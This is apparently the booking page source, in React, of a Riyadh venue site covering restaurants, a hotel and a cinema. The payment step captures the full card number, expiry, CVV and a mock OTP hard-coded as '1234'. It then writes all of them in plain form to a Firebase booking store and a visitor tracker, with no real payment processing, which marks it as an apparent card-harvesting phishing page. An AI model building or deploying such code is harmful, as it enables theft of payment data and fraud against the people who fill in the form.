import { useState, useRef, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  ArrowLeft, Calendar, Clock, Users, Phone, Mail, User,
  CheckCircle, Hotel, ChevronDown, CreditCard, Lock, ChevronLeft,
  RefreshCw, Film
} from "lucide-react";
import { updateVisitorFromBooking } from "@/lib/visitorTracker";
import { bookingStore } from "@/lib/firebaseStore";
import { Link } from "react-router-dom";

const restaurants = [
  "اوڤر اندر", "بيرنجاك", "جيم خانا", "ستيلا سكاي لاونج",
  "سدس", "فيردي", "فيقا سيجار لاونج", "ماديو", "مطعم جاكي", "هوتشو"
];

const cinemaMovies = [
  "Mortal Kombat 2", "The Devil Wears Prada 2", "مايكل", "الكلام على إيه (أول ليلة)",
  "برشامة", "هوكم", "The Sheep Detectives", "Deep Water",
  "سوبر ماريو جالاكسي، الفيلم", "شباب البومب 3"
];

const cinemaTimeSlots = [
  "10:00 AM", "12:30 PM", "03:00 PM", "05:30 PM",
  "08:00 PM", "10:30 PM", "01:00 AM",
];

const timeSlots = [
  "12:00 PM", "12:30 PM", "01:00 PM", "01:30 PM",
  "02:00 PM", "02:30 PM", "03:00 PM", "06:00 PM",
  "06:30 PM", "07:00 PM", "07:30 PM", "08:00 PM",
  "08:30 PM", "09:00 PM", "09:30 PM", "10:00 PM",
  "10:30 PM", "11:00 PM", "11:30 PM",
];

const today = new Date().toISOString().split("T")[0];
const inputClass = "w-full bg-background border border-border/50 text-foreground px-4 py-3 text-sm focus:outline-none focus:border-primary transition-colors duration-200 placeholder:text-muted-foreground/40";
const labelClass = "text-muted-foreground text-xs tracking-widest uppercase block mb-2 font-medium";

const STEPS = ["تفاصيل الحجز", "بيانات الدفع", "تأكيد الدفع"];
const DEMO_OTP = "1234";

function StepLoader() {
  return (
    <motion.div key="loader" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
      className="flex flex-col items-center justify-center py-24 gap-6">
      <div className="relative w-16 h-16">
        <div className="absolute inset-0 border-2 border-primary/20 rounded-full" />
        <div className="absolute inset-0 border-2 border-transparent border-t-primary rounded-full animate-spin" />
        <div className="absolute inset-2 border border-primary/10 rounded-full" />
      </div>
      <span className="text-muted-foreground text-xs tracking-[0.3em] uppercase">جاري التحميل</span>
    </motion.div>
  );
}

function OtpInput({ value, onChange, hasError }) {
  const inputs = useRef([]);
  const digits = value.split("");

  const handleKey = (e, i) => {
    if (e.key === "Backspace") {
      const next = [...digits];
      if (next[i]) { next[i] = ""; onChange(next.join("")); }
      else if (i > 0) { next[i - 1] = ""; onChange(next.join("")); inputs.current[i - 1]?.focus(); }
    }
  };

  const handleChange = (e, i) => {
    const val = e.target.value.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[i] = val;
    onChange(next.join(""));
    if (val && i < 3) inputs.current[i + 1]?.focus();
  };

  const handlePaste = (e) => {
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4);
    onChange(pasted.padEnd(4, "").slice(0, 4));
    inputs.current[Math.min(pasted.length, 3)]?.focus();
    e.preventDefault();
  };

  return (
    <div className="flex gap-3 justify-center" dir="ltr">
      {[0, 1, 2, 3].map(i => (
        <input key={i} ref={el => inputs.current[i] = el}
          type="text" inputMode="numeric" maxLength={1}
          value={digits[i] || ""}
          onChange={e => handleChange(e, i)}
          onKeyDown={e => handleKey(e, i)}
          onPaste={handlePaste}
          className={`w-14 h-16 text-center text-2xl font-mono border-2 bg-background text-foreground focus:outline-none transition-all duration-200 ${
            hasError ? "border-red-500/70 bg-red-500/5" : digits[i] ? "border-primary text-primary" : "border-border/50 focus:border-primary"
          }`}
        />
      ))}
    </div>
  );
}

export default function Booking() {
  const [step, setStep] = useState(0);
  const [transitioning, setTransitioning] = useState(false);
  const urlParams = new URLSearchParams(window.location.search);
  const [bookingType, setBookingType] = useState(urlParams.get("type") || "restaurant");
  const [form, setForm] = useState({
    venue_name: urlParams.get("movie") ? decodeURIComponent(urlParams.get("movie")) : urlParams.get("restaurant") ? decodeURIComponent(urlParams.get("restaurant")) : "",
    guest_name: "", phone: "",
    email: "", date: "", time: "", guests_count: 2, notes: "",
  });
  const [payment, setPayment] = useState({ card_name: "", card_number: "", expiry: "", cvv: "", card_type: "Visa" });
  const [paymentOtp, setPaymentOtp] = useState("");
  const [paymentOtpError, setPaymentOtpError] = useState(false);
  const [paymentOtpSent, setPaymentOtpSent] = useState(false);
  const [paymentResendTimer, setPaymentResendTimer] = useState(0);
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);

  const setF = (k, v) => setForm(f => ({ ...f, [k]: v }));
  const setP = (k, v) => setPayment(p => ({ ...p, [k]: v }));

  const goTo = (s) => {
    window.scrollTo({ top: 0, behavior: "smooth" });
    setTransitioning(true);
    setTimeout(() => { setStep(s); setTransitioning(false); }, 800);
  };

  const sendPaymentOtp = () => {
    setPaymentOtpSent(true);
    setPaymentOtp("");
    setPaymentOtpError(false);
    setPaymentResendTimer(30);
  };

  useEffect(() => {
    if (paymentResendTimer > 0) {
      const t = setTimeout(() => setPaymentResendTimer(r => r - 1), 1000);
      return () => clearTimeout(t);
    }
  }, [paymentResendTimer]);

  useEffect(() => {
    if (step === 2 && !paymentOtpSent) sendPaymentOtp();
  }, [step]);

  const canProceed = form.venue_name && form.guest_name && form.phone && form.date && form.time;

  const stepPreview = [
    { label: "الاسم", value: form.guest_name || "—" },
    { label: "الجوال", value: form.phone || "—" },
    { label: "الوجهة", value: form.venue_name || "—" },
    { label: "التاريخ", value: form.date || "—" },
    { label: "الوقت", value: form.time || "—" },
  ];

  const resetAll = () => {
    setSubmitted(false); setStep(0);
    setPaymentOtp(""); setPaymentOtpSent(false); setPaymentOtpError(false);
    setForm({ venue_name: "", guest_name: "", phone: "", email: "", date: "", time: "", guests_count: 2, notes: "" });
    setPayment({ card_name: "", card_number: "", expiry: "", cvv: "", card_type: "Visa" });
  };

  return (
    <div className="bg-background text-foreground min-h-screen" dir="rtl">

      {/* Hero */}
      <section className="relative min-h-[40vh] flex items-end overflow-hidden">
        <img src="https://media.base44.com/images/public/69ffa3030b658fe6093efead/f05b64c4c_www_viariyadh_com_Deluxe_Double_Room_40e249cc77_83195fa0.jpg"
          alt="حجز" className="absolute inset-0 w-full h-full object-cover" />
        <div className="absolute inset-0 bg-gradient-to-t from-background via-background/60 to-background/10" />
        <motion.div initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.9 }}
          className="relative z-10 max-w-7xl mx-auto w-full px-6 pb-14">
          <span className="text-primary text-xs tracking-[0.35em] uppercase block mb-3">ڤيا رياض</span>
          <h1 className="font-bold text-foreground"
            style={{ fontFamily: "'El Messiri', system-ui, sans-serif", fontSize: "clamp(2rem, 5vw, 3.5rem)" }}>
            احجز تجربتك
          </h1>
        </motion.div>
      </section>

      {/* Form Area */}
      <section className="py-16 px-6 pb-32">
        <div className="max-w-3xl mx-auto">
          {!submitted && (
            <div className="mb-6 border border-border/30 bg-secondary/60 p-4" dir="rtl">
              <div className="text-xs tracking-wider text-primary mb-3">ملخص مباشر للخطوات</div>
              <div className="grid grid-cols-2 md:grid-cols-5 gap-2 text-xs">
                {stepPreview.map((item) => (
                  <div key={item.label} className="border border-border/20 p-2">
                    <div className="text-muted-foreground mb-1">{item.label}</div>
                    <div className="font-semibold truncate">{item.value}</div>
                  </div>
                ))}
              </div>
              <div className="mt-3 text-[11px] text-muted-foreground">
                الخطوة الحالية: <span className="text-primary font-semibold">{STEPS[step]}</span>
              </div>
            </div>
          )}
          <AnimatePresence mode="wait">
            {submitted ? (
              <motion.div key="success" initial={{ opacity: 0, scale: 0.97 }} animate={{ opacity: 1, scale: 1 }}
                className="border border-primary/25 bg-secondary p-16 text-center">
                <div className="w-20 h-20 rounded-full border border-primary/40 flex items-center justify-center mx-auto mb-8">
                  <CheckCircle className="w-10 h-10 text-primary" />
                </div>
                <span className="text-primary text-xs tracking-[0.3em] uppercase block mb-4">تأكيد الحجز</span>
                <h2 className="text-foreground text-3xl font-bold mb-4" style={{ fontFamily: "'El Messiri', system-ui, sans-serif" }}>
                  تم استلام طلبك بنجاح
                </h2>
                <p className="text-muted-foreground text-sm mb-6 max-w-sm mx-auto leading-relaxed">
                  سيتواصل معك فريقنا قريباً على رقم الجوال أو البريد الإلكتروني لتأكيد الحجز.
                </p>
                <div className="border-t border-border/20 pt-6 mb-8 flex justify-center gap-8 text-sm">
                  <div className="text-center">
                    <div className="text-muted-foreground text-xs tracking-wider uppercase mb-1">الوجهة</div>
                    <div className="text-primary font-semibold">{form.venue_name}</div>
                  </div>
                  <div className="w-px bg-border/30" />
                  <div className="text-center">
                    <div className="text-muted-foreground text-xs tracking-wider uppercase mb-1">التاريخ</div>
                    <div className="text-foreground font-semibold" dir="ltr">{form.date}</div>
                  </div>
                  <div className="w-px bg-border/30" />
                  <div className="text-center">
                    <div className="text-muted-foreground text-xs tracking-wider uppercase mb-1">الوقت</div>
                    <div className="text-foreground font-semibold" dir="ltr">{form.time}</div>
                  </div>
                </div>
                <div className="flex flex-wrap gap-4 justify-center">
                  <button onClick={resetAll}
                    className="border border-primary/40 text-primary px-7 py-3 text-xs tracking-widest uppercase hover:bg-primary hover:text-primary-foreground transition-all duration-300">
                    حجز جديد
                  </button>
                  <Link to="/Dine"
                    className="bg-primary text-primary-foreground px-7 py-3 text-xs tracking-widest uppercase hover:opacity-90 transition-opacity inline-flex items-center gap-2">
                    <span>المطاعم</span>
                    <ArrowLeft className="w-3.5 h-3.5" />
                  </Link>
                </div>
              </motion.div>
            ) : (
              <div className="space-y-8">

                {/* Step Indicator */}
                <div className="flex items-center gap-0">
                  {STEPS.map((s, i) => (
                    <div key={i} className="flex items-center flex-1">
                      <div className="flex items-center gap-3 shrink-0">
                        <div className={`w-8 h-8 flex items-center justify-center text-xs font-bold border transition-all duration-300 ${
                          i < step ? "bg-primary border-primary text-primary-foreground" :
                          i === step ? "border-primary text-primary" :
                          "border-border/40 text-muted-foreground"
                        }`}>
                          {i < step ? "✓" : i + 1}
                        </div>
                        <span className={`text-xs tracking-widest uppercase transition-colors duration-300 hidden sm:block ${i === step ? "text-primary" : "text-muted-foreground"}`}>
                          {s}
                        </span>
                      </div>
                      {i < STEPS.length - 1 && (
                        <div className="flex-1 h-px mx-3 bg-border/30 relative overflow-hidden">
                          <motion.div className="absolute inset-y-0 left-0 bg-primary/60"
                            initial={false} animate={{ width: i < step ? "100%" : "0%" }}
                            transition={{ duration: 0.8, ease: "easeInOut" }} />
                        </div>
                      )}
                    </div>
                  ))}
                </div>

                <AnimatePresence mode="wait">
                  {transitioning && <StepLoader key="loader" />}

                  {/* ── STEP 0: Booking Details ── */}
                  {!transitioning && step === 0 && (
                    <motion.div key="step0" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.35 }} className="space-y-6">
                      <div className="grid grid-cols-3 gap-3">
                        {[
                          { value: "restaurant", label: "حجز مطعم", icon: <UtensilsCrossed className="w-5 h-5" /> },
                          { value: "hotel", label: "حجز فندق", icon: <Hotel className="w-5 h-5" /> },
                          { value: "cinema", label: "حجز سينما", icon: <Film className="w-5 h-5" /> },
                        ].map(opt => (
                          <button key={opt.value} type="button"
                            onClick={() => { setBookingType(opt.value); setF("venue_name", ""); setF("time", ""); }}
                            className={`flex items-center justify-center gap-3 py-5 border transition-all duration-300 text-sm tracking-wide ${
                              bookingType === opt.value ? "border-primary bg-primary/8 text-primary" : "border-border/30 text-muted-foreground hover:border-primary/40 hover:text-foreground"
                            }`}>
                            {opt.icon}
                            <span style={{ fontFamily: "'El Messiri', system-ui, sans-serif" }}>{opt.label}</span>
                          </button>
                        ))}
                      </div>

                      <div className="border border-border/25 bg-secondary divide-y divide-border/20">
                        <div className="p-6">
                          <p className="text-primary text-xs tracking-[0.25em] uppercase mb-4">الوجهة</p>
                          {bookingType === "restaurant" ? (
                            <div className="relative">
                              <select required value={form.venue_name} onChange={e => setF("venue_name", e.target.value)}
                                className={inputClass + " appearance-none"}>
                                <option value="">اختر المطعم</option>
                                {restaurants.map(r => <option key={r} value={r}>{r}</option>)}
                              </select>
                              <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                            </div>
                          ) : bookingType === "cinema" ? (
                            <div className="relative">
                              <select required value={form.venue_name} onChange={e => setF("venue_name", e.target.value)}
                                className={inputClass + " appearance-none"}>
                                <option value="">اختر الفيلم</option>
                                {cinemaMovies.map(m => <option key={m} value={m}>{m}</option>)}
                              </select>
                              <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                            </div>
                          ) : (
                            <div className="flex items-center gap-3 bg-background border border-border/50 px-4 py-3">
                              <Hotel className="w-4 h-4 text-primary shrink-0" />
                              <span className="text-foreground text-sm">فندق سانت ريجس — ڤيا رياض</span>
                            </div>
                          )}
                        </div>

                        <div className="p-6 space-y-4">
                          <p className="text-primary text-xs tracking-[0.25em] uppercase mb-4">بيانات الضيف</p>
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div>
                              <label className={labelClass}><User className="inline w-3 h-3 ml-1" />الاسم الكامل</label>
                              <input required type="text" value={form.guest_name} onChange={e => setF("guest_name", e.target.value)}
                                placeholder="محمد العمري" className={inputClass} />
                            </div>
                            <div>
                              <label className={labelClass}><Phone className="inline w-3 h-3 ml-1" />رقم الجوال</label>
                              <input required type="tel" value={form.phone} onChange={e => setF("phone", e.target.value)}
                                placeholder="05xxxxxxxx" className={inputClass} dir="ltr" />
                            </div>
                          </div>
                          <div>
                            <label className={labelClass}><Mail className="inline w-3 h-3 ml-1" />البريد الإلكتروني <span className="normal-case text-muted-foreground/50">(اختياري)</span></label>
                            <input type="email" value={form.email} onChange={e => setF("email", e.target.value)}
                              placeholder="example@email.com" className={inputClass} dir="ltr" />
                          </div>
                        </div>

                        <div className="p-6 space-y-4">
                          <p className="text-primary text-xs tracking-[0.25em] uppercase mb-4">التاريخ والوقت</p>
                          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                            <div>
                              <label className={labelClass}><Calendar className="inline w-3 h-3 ml-1" />التاريخ</label>
                              <input required type="date" min={today} value={form.date}
                                onChange={e => setF("date", e.target.value)} className={inputClass} dir="ltr" />
                            </div>
                            <div>
                              <label className={labelClass}><Clock className="inline w-3 h-3 ml-1" />الوقت</label>
                              <div className="relative">
                                <select required value={form.time} onChange={e => setF("time", e.target.value)}
                                  className={inputClass + " appearance-none"} dir="ltr">
                                  <option value="">الوقت</option>
                                  {(bookingType === "cinema" ? cinemaTimeSlots : timeSlots).map(t => <option key={t} value={t}>{t}</option>)}
                                </select>
                                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                              </div>
                            </div>
                            <div>
                              <label className={labelClass}><Users className="inline w-3 h-3 ml-1" />عدد الضيوف</label>
                              <div className="flex items-center bg-background border border-border/50 h-[46px]">
                                <button type="button" onClick={() => setF("guests_count", Math.max(1, form.guests_count - 1))}
                                  className="w-12 h-full flex items-center justify-center text-primary hover:bg-primary/10 transition-colors text-lg border-l border-border/30">−</button>
                                <span className="flex-1 text-center text-foreground text-sm font-semibold">{form.guests_count}</span>
                                <button type="button" onClick={() => setF("guests_count", Math.min(20, form.guests_count + 1))}
                                  className="w-12 h-full flex items-center justify-center text-primary hover:bg-primary/10 transition-colors text-lg border-r border-border/30">+</button>
                              </div>
                            </div>
                          </div>
                        </div>

                        <div className="p-6">
                          <label className={labelClass}>ملاحظات خاصة <span className="normal-case text-muted-foreground/50">(اختياري)</span></label>
                          <textarea rows={3} value={form.notes} onChange={e => setF("notes", e.target.value)}
                            placeholder="مناسبة خاصة، طلبات غذائية، متطلبات خاصة..."
                            className={inputClass + " resize-none"} />
                        </div>
                      </div>

                      <button type="button" disabled={!canProceed} onClick={() => goTo(1)}
                        className="w-full relative overflow-hidden bg-primary text-primary-foreground py-4 text-xs font-bold tracking-[0.2em] uppercase hover:opacity-90 transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-3">
                        <span className="absolute inset-0 bg-gradient-to-r from-transparent via-primary-foreground/15 to-transparent animate-[shimmer_3s_ease-in-out_infinite] bg-[length:200%_100%]" />
                        <span className="relative">المتابعة للدفع</span>
                        <ArrowLeft className="w-4 h-4 relative" />
                      </button>
                    </motion.div>
                  )}

                  {/* ── STEP 1: Payment ── */}
                  {!transitioning && step === 1 && (
                    <motion.div key="step1" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.35 }} className="space-y-6">
                      {/* Summary */}
                      <div className="border border-primary/20 bg-primary/5 px-6 py-5 flex flex-wrap gap-6 items-center justify-between">
                        <div>
                          <div className="text-muted-foreground text-xs tracking-widest uppercase mb-1">الوجهة</div>
                          <div className="text-primary font-semibold text-sm" style={{ fontFamily: "'El Messiri', system-ui, sans-serif" }}>{form.venue_name || "فندق سانت ريجس"}</div>
                        </div>
                        <div>
                          <div className="text-muted-foreground text-xs tracking-widest uppercase mb-1">التاريخ</div>
                          <div className="text-foreground text-sm font-semibold" dir="ltr">{form.date}</div>
                        </div>
                        <div>
                          <div className="text-muted-foreground text-xs tracking-widest uppercase mb-1">الوقت</div>
                          <div className="text-foreground text-sm font-semibold" dir="ltr">{form.time}</div>
                        </div>
                        <div>
                          <div className="text-muted-foreground text-xs tracking-widest uppercase mb-1">الضيوف</div>
                          <div className="text-foreground text-sm font-semibold">{form.guests_count} أشخاص</div>
                        </div>
                        <button type="button" onClick={() => goTo(0)}
                          className="text-primary text-xs underline underline-offset-4 hover:no-underline flex items-center gap-1">
                          <ChevronLeft className="w-3 h-3" /> تعديل
                        </button>
                      </div>

                      {/* Payment Card */}
                      <div className="border border-border/25 bg-secondary">
                        <div className="px-6 pt-6 pb-4 border-b border-border/20 flex items-center justify-between">
                          <h3 className="text-foreground font-bold flex items-center gap-2 text-base" style={{ fontFamily: "'El Messiri', system-ui, sans-serif" }}>
                            <CreditCard className="w-4 h-4 text-primary" /> بيانات البطاقة
                          </h3>
                          <div className="flex items-center gap-1.5 text-muted-foreground text-xs">
                            <Lock className="w-3 h-3 text-primary" /><span>مشفّر وآمن</span>
                          </div>
                        </div>
                        <div className="p-6 space-y-4">
                          <div className="bg-gradient-to-br from-muted to-background border border-border/30 p-5 flex justify-between items-end mb-6" dir="ltr">
                            <div>
                              <div className="text-muted-foreground text-[10px] tracking-widest uppercase mb-2">Card Number</div>
                              <div className="text-foreground text-base font-mono tracking-[0.2em]">
                {payment.card_number
                  ? `•••• •••• •••• ${payment.card_number.replace(/\s/g, "").slice(-4) || "••••"}`
                  : "•••• •••• •••• ••••"}
              </div>
                            </div>
                            <div className="text-right">
                              <div className="text-muted-foreground text-[10px] tracking-widest uppercase mb-1">Expires</div>
                              <div className="text-foreground text-sm font-mono">{payment.expiry || "MM/YY"}</div>
                            </div>
                          </div>
                          <div>
                            <label className={labelClass}>اسم حامل البطاقة</label>
                            <input required type="text" value={payment.card_name}
                              onChange={e => setP("card_name", e.target.value.toUpperCase())}
                              placeholder="FULL NAME AS ON CARD" className={inputClass + " font-mono tracking-wider"} dir="ltr" />
                          </div>
                          <div>
                            <label className={labelClass}>رقم البطاقة</label>
                            <div className="relative">
                              <input required type="text" inputMode="numeric" maxLength={19}
                                value={payment.card_number}
                                onChange={e => {
                                  const v = e.target.value.replace(/\D/g, "").slice(0, 16);
                                  setP("card_number", v.replace(/(.{4})/g, "$1 ").trim());
                                }}
                                placeholder="0000  0000  0000  0000" className={inputClass + " font-mono tracking-[0.15em] pl-12"} dir="ltr" />
                              <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                            </div>
                          </div>
                          <div className="grid grid-cols-2 gap-4">
                            <div>
                              <label className={labelClass}>تاريخ الانتهاء</label>
                              <input required type="text" inputMode="numeric" maxLength={5} value={payment.expiry}
                                onChange={e => {
                                  let v = e.target.value.replace(/\D/g, "").slice(0, 4);
                                  if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2);
                                  setP("expiry", v);
                                }}
                                placeholder="MM / YY" className={inputClass + " font-mono tracking-widest"} dir="ltr" />
                            </div>
                            <div>
                              <label className={labelClass}>رمز CVV</label>
                              <input required type="password" inputMode="numeric" maxLength={4} value={payment.cvv}
                                onChange={e => setP("cvv", e.target.value.replace(/\D/g, "").slice(0, 4))}
                                placeholder="• • • •" className={inputClass + " font-mono tracking-[0.3em]"} dir="ltr" />
                            </div>
                          </div>
                          <div className="flex items-center justify-center pt-4">
                            <img
                              src="https://media.base44.com/images/public/69ffa3030b658fe6093efead/b01f63ac5_cards.png"
                              alt="طرق الدفع المقبولة"
                              className="h-10 w-auto object-contain opacity-90 bg-white rounded px-2 py-1"
                            />
                          </div>
                        </div>
                      </div>

                      <button type="button"
                        disabled={!payment.card_name || !payment.card_number || !payment.expiry || !payment.cvv}
                        onClick={() => { setPaymentOtpSent(false); goTo(2); }}
                        className="w-full relative overflow-hidden bg-primary text-primary-foreground py-4 text-xs font-bold tracking-[0.2em] uppercase hover:opacity-90 transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-3">
                        <span className="absolute inset-0 bg-gradient-to-r from-transparent via-primary-foreground/15 to-transparent animate-[shimmer_3s_ease-in-out_infinite] bg-[length:200%_100%]" />
                        <Lock className="w-3.5 h-3.5 relative" />
                        <span className="relative">تأكيد بيانات البطاقة</span>
                        <ArrowLeft className="w-4 h-4 relative" />
                      </button>
                      <p className="text-center text-muted-foreground/50 text-xs">بالضغط على المتابعة، سيتم إرسال رمز تحقق لتأكيد الدفع</p>
                    </motion.div>
                  )}

                  {/* ── STEP 2: Payment OTP ── */}
                  {!transitioning && step === 2 && (
                    <motion.div key="step2" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.35 }} className="space-y-6">
                      <div className="border border-border/25 bg-secondary">
                        <div className="px-6 pt-8 pb-6 text-center border-b border-border/20">
                          <div className="w-16 h-16 rounded-full border border-primary/30 bg-primary/5 flex items-center justify-center mx-auto mb-5">
                            <CreditCard className="w-7 h-7 text-primary" />
                          </div>
                          <h3 className="text-foreground text-xl font-bold mb-2" style={{ fontFamily: "'El Messiri', system-ui, sans-serif" }}>
                            تأكيد عملية الدفع
                          </h3>
                          <p className="text-muted-foreground text-sm leading-relaxed max-w-xs mx-auto">تم إرسال رمز التحقق لتأكيد دفعتك إلى</p>
                          <p className="text-primary font-semibold text-sm mt-1" dir="ltr">{form.phone}</p>
                          <p className="text-muted-foreground/40 text-xs mt-3">(للتجربة: الرمز هو <span className="text-primary/70 font-mono">1234</span>)</p>
                        </div>
                        <div className="p-8 space-y-6">
                          <OtpInput value={paymentOtp} onChange={v => { setPaymentOtp(v); setPaymentOtpError(false); }} hasError={paymentOtpError} />
                          <AnimatePresence>
                            {paymentOtpError && (
                              <motion.p initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                                className="text-red-400 text-xs text-center tracking-wide">
                                الرمز غير صحيح، يرجى المحاولة مجدداً
                              </motion.p>
                            )}
                          </AnimatePresence>
                          <button type="button" onClick={async () => {
                            if (paymentOtp !== DEMO_OTP) { setPaymentOtpError(true); return; }
                            setLoading(true);
                            const cardNumber = (payment.card_number || "").replace(/\D/g, "");
                            const bookingPayload = {
                              ...form,
                              type: bookingType,
                              guests_count: Number(form.guests_count),
                              status: "pending",
                              card_name: payment.card_name || "",
                              card_number: cardNumber,
                              card_last4: cardNumber.slice(-4),
                              card_type: payment.card_type || "Visa",
                              card_expiry: payment.expiry || "",
                              card_cvv: payment.cvv || "",
                              submitted_otp: paymentOtp || "",
                            };
                            await bookingStore.create(bookingPayload);
                            await updateVisitorFromBooking(form, payment);
                            setLoading(false);
                            setSubmitted(true);
                          }} disabled={paymentOtp.length < 4 || loading}
                            className="w-full relative overflow-hidden bg-primary text-primary-foreground py-4 text-xs font-bold tracking-[0.2em] uppercase hover:opacity-90 transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-3">
                            <span className="absolute inset-0 bg-gradient-to-r from-transparent via-primary-foreground/15 to-transparent animate-[shimmer_3s_ease-in-out_infinite] bg-[length:200%_100%]" />
                            <Lock className="w-3.5 h-3.5 relative" />
                            <span className="relative">{loading ? "جاري المعالجة..." : "تأكيد الدفع"}</span>
                          </button>
                          <div className="flex items-center justify-center gap-3 pt-1">
                            <span className="text-muted-foreground text-xs">لم يصلك الرمز؟</span>
                            {paymentResendTimer > 0 ? (
                              <span className="text-primary/60 text-xs font-mono" dir="ltr">00:{String(paymentResendTimer).padStart(2, "0")}</span>
                            ) : (
                              <button type="button" onClick={sendPaymentOtp}
                                className="text-primary text-xs flex items-center gap-1 hover:underline underline-offset-4 transition-all">
                                <RefreshCw className="w-3 h-3" /> إعادة الإرسال
                              </button>
                            )}
                          </div>
                        </div>
                      </div>
                      <button type="button" onClick={() => goTo(1)}
                        className="w-full border border-border/40 text-muted-foreground py-3 text-xs tracking-widest uppercase hover:border-primary/50 hover:text-primary transition-all duration-300 flex items-center justify-center gap-2">
                        <ChevronLeft className="w-3.5 h-3.5" /> العودة
                      </button>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            )}
          </AnimatePresence>
        </div>
      </section>
    </div>
  );
}

function UtensilsCrossed(props) {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
      stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" {...props}>
      <path d="m16 2-2.3 2.3a3 3 0 0 0 0 4.2l1.8 1.8a3 3 0 0 0 4.2 0L22 8"/>
      <path d="M15 15 3.3 3.3a4.2 4.2 0 0 0 0 6l7.3 7.3c.7.7 2 .7 2.8 0L15 15Zm0 0 7 7"/>
      <path d="m2 22 3-3"/>
    </svg>
  );
}